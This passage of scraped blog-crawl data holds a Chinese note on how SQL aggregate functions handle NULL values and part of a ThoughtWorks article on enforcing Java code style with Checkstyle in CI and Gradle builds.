!important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ninsert into #temp(id)\r\nvalues(null)\r\n\r\nselect count(0) as count_all\r\n    ,count(id) as count_id\r\n    ,max(id) as max_id\r\n    ,min(id) as min_id\r\n    ,avg(id) as avg_id\r\n    ,sum(id) as sum_id\r\nfrom #temp</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bceddaeb19071225850-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bceddaeb19071225850-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bceddaeb19071225850-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bceddaeb19071225850-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bceddaeb19071225850-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bceddaeb19071225850-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594bceddaeb19071225850-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bceddaeb19071225850-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594bceddaeb19071225850-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bceddaeb19071225850-10\">10</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bceddaeb19071225850-1\"><span class=\"crayon-e\">insert </span><span class=\"crayon-v\">into</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\">#temp(id)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bceddaeb19071225850-2\"><span class=\"crayon-e\">values</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">null</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-594bceddaeb19071225850-3\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bceddaeb19071225850-4\"><span class=\"crayon-e\">select </span><span class=\"crayon-e\">count</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">as</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">count</span><span class=\"crayon-sy\">_</span>all</div><div class=\"crayon-line\" id=\"crayon-594bceddaeb19071225850-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">,</span><span class=\"crayon-e\">count</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">id</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">as</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">count</span><span class=\"crayon-sy\">_</span>id</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bceddaeb19071225850-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">,</span><span class=\"crayon-e\">max</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">id</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">as</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">max</span><span class=\"crayon-sy\">_</span>id</div><div class=\"crayon-line\" id=\"crayon-594bceddaeb19071225850-7\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">,</span><span class=\"crayon-e\">min</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">id</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">as</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">min</span><span class=\"crayon-sy\">_</span>id</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bceddaeb19071225850-8\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">,</span><span class=\"crayon-e\">avg</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">id</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">as</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">avg</span><span class=\"crayon-sy\">_</span>id</div><div class=\"crayon-line\" id=\"crayon-594bceddaeb19071225850-9\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">,</span><span class=\"crayon-e\">sum</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">id</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">as</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sum_id</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bceddaeb19071225850-10\"><span class=\"crayon-v\">from</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\">#temp</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0017 seconds] -->\r\n<p>聚合函数（max,min,sum,avg和count）忽略null值，但不代表聚合函数不返回null值：如果数据表为空表，或聚合列值都是null，那么max,min,sum,avg聚合函数返回null值，而count 聚合函数返回0。聚合函数的共性：<span id=\"mt3\" class=\"sentence SentenceHover\">Null values are ignored。</span></p>\n<p><img class=\"aligncenter\" src=\"http://images2015.cnblogs.com/blog/628084/201706/628084-20170620112538616-1090159798.png\" alt=\"\"></p>\n<p>不再迷惑：<strong>当不返回任何值时，数据库引擎不确定返回值，就把无值转换为NULL值。</strong></p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111541\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111541votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111541\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://images2015.cnblogs.com/blog/628084/201706/628084-20170620110230601-1550885802.png"], "fav_nums": 1, "comment_nums": 0, "create_date": "2017/06/21", "praise_nums": 1}
{"tags": "编程风格,java,开发", "front_image_path": "full/8df83dd8bc57ae7800dd00484fe81b189041997c.jpg", "title": "拯救 Java Code Style 强迫症", "url_object_id": "3a898adcf998284e1075b145b18db2d5", "url": "http://blog.jobbole.com/111468/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文作者： <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/thoughtworkschina\">ThoughtWorks</a> 。未经作者许可，禁止转载！<br>欢迎加入伯乐在线 <a href=\"http://blog.jobbole.com/99322\" target=\"_blank\">专栏作者</a>。</div><p>这篇文章缘起于上一个持续交付的咨询项目，当时正在指导客户团队的Java工程师做Code Review，发现一个很有意思的现象：有一位工程师对Code Style特别在意，所以在Code Review的大部分时间中都是该工程师在指出哪里哪里的格式不对，但是团队并没有找到改进方法，每次的结论都是“下次我注意一点。”我挺欣赏这位工程师对Code Style的认真态度，所以就萌生了“怎么拯救Code Style强迫症”的想法。</p>\n<h3>要点</h3>\n<ul>\n<li>Code Style不是个人喜好问题，它会影响工作效率，团队应将其当做工程实践予以重视。</li>\n<li>Code Style需要端到端的工具支持，尽早解决问题，避免技术债。</li>\n<li>以Checkstyle作为核心工具支撑Java项目的Code Style实施方案。</li>\n</ul>\n<h3>Code Style是一项工程实践</h3>\n<p><a href=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/06/1-style.jpg\"><img src=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/06/1-style.jpg\" alt=\"\" width=\"479\" height=\"310\"></a></p>\n<p>我是右侧风格的忠实拥趸，如果让我在工作的项目中看到左侧风格的代码，你猜猜我的反应是什么。</p>\n<p><a href=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/06/2-gitblame.jpg\"><img src=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/06/2-gitblame.jpg\" alt=\"\" width=\"400\" height=\"400\"></a></p>\n<p>嗯，可能我对代码风格确实有些强迫症，但事实上，Code Style并不仅仅是代码是否好看那么简单，如果没有按照惯例来编写代码，甚至会让阅读者产生疑惑。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bcde4bfd0f115916531\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nprivate Listener listener = new Listener() // So Listener looks like a class?  \r\n{}; // Oops, it is an interface</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bcde4bfd0f115916531-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bcde4bfd0f115916531-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bcde4bfd0f115916531-1\"><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Listener </span><span class=\"crayon-v\">listener</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Listener</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// So Listener looks like a class?  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bcde4bfd0f115916531-2\"><span class=\"crayon-sy\">{</span><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// Oops, it is an interface</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>如果代码可读性还不足以打动你，那么想象一下这个场景，你的同事说他修复了两个空指针问题，请你帮忙Code Review，你查看了这个文件的修订历史，乍看之下有许多改动，看来是个大动作。然而事实上，绝大部分改动是代码格式调整，只有两处改动与需要Review的问题相关。</p>\n<p style=\"text-align: center;\"><a href=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/06/3-happy-code-review.jpg\"><img src=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/06/3-happy-code-review-1024x365.jpg\" alt=\"\" width=\"700\" height=\"250\"></a></p>\n<p style=\"text-align: center;\">(看来这位同事的IDE使用了不同的自动缩进设置，导致所有行都产生了缩进)</p>\n<p>之所以会产生以上这些影响工作效率的问题，是因为团队没有重视Code Style，没有把它当做一项工程实践，既没有对其达成一致，也没有正确地使用工具帮助实施。</p>\n<h3>那就按照工程实践的标准来实施Code Style</h3>\n<p>本文将重点介绍Java项目中Code Style的工具支持，但在此之前，你的团队需要一起做一些决定：</p>\n<p><strong>使用哪种Code Style？</strong></p>\n<p>每个人可能都有偏好的style，但在团队协作面前，需要一定的妥协。有些公司或组织有着统一的Code Style指导标准，萧规曹随是个不错的选择（但是要确保这类统一指导标准在制定时参考了开发人员的意见，是切实可行的），你的团队也可以自己裁剪，但至少要保证项目（Repository）级别上使用同一种Style。</p>\n<p><strong>如何处理不符合Code Style的提交？</strong></p>\n<p>大家往往懈怠于事后补救的方式，我的建议是不要让不符合约定的代码流入代码库。对于遗留项目，尤其是大型项目，可以选择一部分代码作为实施范围，集中修复Style问题后严格实施，切忌操之过急，最后团队疲惫不堪只得放弃。</p>\n<p>我们都知道人工监督检查的方式是不可持续和不可靠的，来看看有哪些工具可以提供帮助吧。</p>\n<h3>懒惰是第一生产力</h3>\n<p>工程实践不能没有自动化工具支持，在Java生态圈中，Code Style工具最出名的应该是Checkstyle了，它可以通过XML形式的<a href=\"https://martinfowler.com/books/dsl.html\">外部DSL</a>来定义Code Style的检查风格，比如你可以从这里找到<a href=\"https://github.com/checkstyle/checkstyle/blob/master/src/main/resources/google_checks.xml\">Google的Java Checkstyle配置文件</a>。这里我不会详细介绍Checkstyle本身，相反，我会更多地探讨如何工程化地使用Checkstyle，在交付代码的各个活动中，我们都可以用到Checkstyle，进行360°无死角的检查。</p>\n<p><a href=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/06/4-lifecycle-overview.jpg\"><img class=\"aligncenter\" src=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/06/4-lifecycle-overview-1024x558.jpg\" alt=\"\" width=\"700\" height=\"381\"></a></p>\n<p style=\"text-align: center;\">（和Code Style相关的代码交付生命周期）</p>\n<h3>守住提交的质量关口</h3>\n<p>为了贯彻不让不符合约定的代码流入代码库的决定，可以优先在服务端设置Code Style的检查关卡。</p>\n<p style=\"text-align: center;\"><a href=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/06/5-lifecycle-ci.jpg\"><img src=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/06/5-lifecycle-ci-1024x584.jpg\" alt=\"\" width=\"700\" height=\"399\"></a></p>\n<p style=\"text-align: center;\">（优先守住代码提交时的服务端检查，可以考虑使用CI服务器来实现）</p>\n<p><strong>从实现层面上说，有两种方式：</strong></p>\n<p>一是在SCM（Source Control Management，例如Git/SVN）服务端设置检查项，如果不达标则拒绝提交，但这种方式相对不容易实现，而且一般SCM服务端也不由开发团队管理，设置起来不灵活也不方便。</p>\n<p>二是利用<a href=\"https://www.thoughtworks.com/continuous-integration\">持续集成</a>服务器，开发团队的每一次提交都会触发一次构建，我们可以在构建脚本中加入Checkstyle检查，如果有不达标的代码则让构建失败，以便告诉提交者立即修复Style问题。我更推荐这个方案，因为相关的工具支持都很成熟，实现简单，而且构建过程可以在开发者的本地环境复制，以便在后续改进中将Checkstyle检查前移，提供更快的反馈。如果团队使用Maven/Gradle等构建工具，可以用插件的方式实现Checkstyle检查并嵌入到整个构建过程中。这样CI服务器只要调用构建脚本就行了。</p>\n<h3>在开发者本地验证Style</h3>\n<p><a href=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/06/6-lifecycle-local.jpg\"><img class=\"aligncenter\" src=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/06/6-lifecycle-local-1024x559.jpg\" alt=\"\" width=\"700\" height=\"382\"></a></p>\n<p style=\"text-align: center;\">（在开发者本地实现验证，反馈关口前移）</p>\n<p>在实现了CI验证后，就可以着手实现开发者本地验证了，这样开发者就不用等到提交代码到服务端后才会获得反馈了。由于之前采用的是构建工具的插件方案，所以开发者在本地运行构建就能实现验证了。比如Gradle提供了Checkstyle插件支持，你可以在这里找到Gradle Checkstyle Plugin的详细配置文档，如果你使用Maven，则可以参考这里。现在只需要一条命令，开发者久能在本地验证Code style了。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bcde4bfd1c383467139\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# build.gradle \r\n# omitted plugins \r\napply plugin: 'checkstyle'  \r\ncheckstyle {     \r\n    configFile = file(\"config/checkstyle.xml\") //指定checkstyle配置文件     \r\n    toolVersion = \"7.4\" //指定checkstyle工具的版本，部分style规则有版本要求 \r\n}  \r\ncheckstyleTest.exclude \"**/ContractVerifierTest**\" // 忽略检查生成代码，这个锅我们不背  \r\n\r\n// 如果出现checkstyle warning也使构建失败，插件默认只支持checkstyle error失败 \r\n// Fail build on Checkstyle Warning Violation · Issue #881 \r\ntasks.withType(Checkstyle).each { checkstyleTask -&gt;     \r\n    checkstyleTask.doLast {         \r\n        reports.all { report -&gt;             \r\n            def outputFile = report.destination             \r\n            if (outputFile.exists() &amp;&amp; outputFile.text.contains(\"&lt;error \")) {    \r\n                throw new GradleException(\"There were checkstyle warnings! For more info check $outputFile\")             \r\n            }         \r\n        }     \r\n    }\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bcde4bfd1c383467139-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bcde4bfd1c383467139-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bcde4bfd1c383467139-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bcde4bfd1c383467139-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bcde4bfd1c383467139-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bcde4bfd1c383467139-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594bcde4bfd1c383467139-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bcde4bfd1c383467139-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594bcde4bfd1c383467139-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bcde4bfd1c383467139-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-594bcde4bfd1c383467139-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bcde4bfd1c383467139-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-594bcde4bfd1c383467139-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bcde4bfd1c383467139-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-594bcde4bfd1c383467139-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bcde4bfd1c383467139-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-594bcde4bfd1c383467139-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bcde4bfd1c383467139-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-594bcde4bfd1c383467139-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bcde4bfd1c383467139-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-594bcde4bfd1c383467139-21\">21</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bcde4bfd1c383467139-1\"><span class=\"crayon-p\"># build.gradle </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bcde4bfd1c383467139-2\"><span class=\"crayon-p\"># omitted plugins </span></div><div class=\"crayon-line\" id=\"crayon-594bcde4bfd1c383467139-3\"><span class=\"crayon-e\">apply </span><span class=\"crayon-v\">plugin</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'checkstyle'</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bcde4bfd1c383467139-4\"><span class=\"crayon-e\">checkstyle</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\">     </span></div><div class=\"crayon-line\" id=\"crayon-594bcde4bfd1c383467139-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">configFile</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">file</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"config/checkstyle.xml\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">//指定checkstyle配置文件     </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bcde4bfd1c383467139-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">toolVersion</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"7.4\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">//指定checkstyle工具的版本，部分style规则有版本要求 </span></div><div class=\"crayon-line\" id=\"crayon-594bcde4bfd1c383467139-7\"><span class=\"crayon-sy\">}</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bcde4bfd1c383467139-8\"><span class=\"crayon-v\">checkstyleTest</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">exclude</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"**/ContractVerifierTest**\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// 忽略检查生成代码，这个锅我们不背  </span></div><div class=\"crayon-line\" id=\"crayon-594bcde4bfd1c383467139-9\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bcde4bfd1c383467139-10\"><span class=\"crayon-c\">// 如果出现checkstyle warning也使构建失败，插件默认只支持checkstyle error失败 </span></div><div class=\"crayon-line\" id=\"crayon-594bcde4bfd1c383467139-11\"><span class=\"crayon-c\">// Fail build on Checkstyle Warning Violation · Issue #881 </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bcde4bfd1c383467139-12\"><span class=\"crayon-v\">tasks</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">withType</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">Checkstyle</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-st\">each</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">checkstyleTask</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\">     </span></div><div class=\"crayon-line\" id=\"crayon-594bcde4bfd1c383467139-13\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">checkstyleTask</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">doLast</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\">         </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bcde4bfd1c383467139-14\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">reports</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">all</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">report</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\">             </span></div><div class=\"crayon-line\" id=\"crayon-594bcde4bfd1c383467139-15\"><span class=\"crayon-h\">            </span><span class=\"crayon-e\">def </span><span class=\"crayon-v\">outputFile</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">report</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">destination             </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bcde4bfd1c383467139-16\"><span class=\"crayon-e\">            </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">outputFile</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">exists</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">outputFile</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">text</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">contains</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"&lt;error \"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\">    </span></div><div 